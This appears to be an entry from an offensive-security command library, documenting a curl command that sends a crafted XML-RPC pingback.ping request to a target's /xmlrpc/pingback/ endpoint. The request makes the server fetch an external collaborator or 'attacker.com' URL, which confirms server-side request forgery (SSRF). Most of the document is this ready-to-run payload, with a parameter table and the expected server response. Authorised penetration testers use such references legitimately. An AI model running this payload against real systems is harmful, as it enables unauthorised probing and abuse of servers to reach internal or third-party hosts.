---
id: cmd-curl-xmlrpc-ssrf
data: >-
  curl -X POST https://target.com/xmlrpc/pingback/ -H "Content-Type: text/xml"
  -d '<?xml
  version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://your-collaborator.burpcollaborator.net/</string></value></param><param><value><string>https://target.com/web/guest/home/</string></value></param></params></methodCall>'
tags:
  - ssrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.755Z'
verified: false
validated: true
submitted: true
---
# curl-xmlrpc-ssrf-trigger

## Command

```bash
curl -X POST https://target.com/xmlrpc/pingback/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://your-collaborator.burpcollaborator.net/</string></value></param><param><value><string>https://target.com/web/guest/home/</string></value></param></params></methodCall>'
```

## Description

Sends a POST request to the XML-RPC pingback endpoint with a crafted XML payload to trigger SSRF by forcing the server to request an external collaborator URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: text/xml"` | Sets XML content type | Yes |
| `-d '...'` | XML payload with pingback.ping, target URL in first param, source in second | Yes |
| `https://target.com/xmlrpc/pingback/` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/xmlrpc/pingback/ -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/</string></value></param><param><value><string>https://example.com/</string></value></param></params></methodCall>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/xmlrpc/pingback/ -H "Content-Type: text/xml" -d '...' --verbose
```

## Expected Output

HTTP/1.1 200 OK followed by XML response like <methodResponse><params><param><value><struct><member><name>flerror</name><value><boolean>0</boolean></value></member></struct></value></param></params></methodResponse>. Monitor external tools for server interactions.

## Related

- [[Related Procedure: Craft-XML-RPC-Pingback-Request-for-SSRF]]
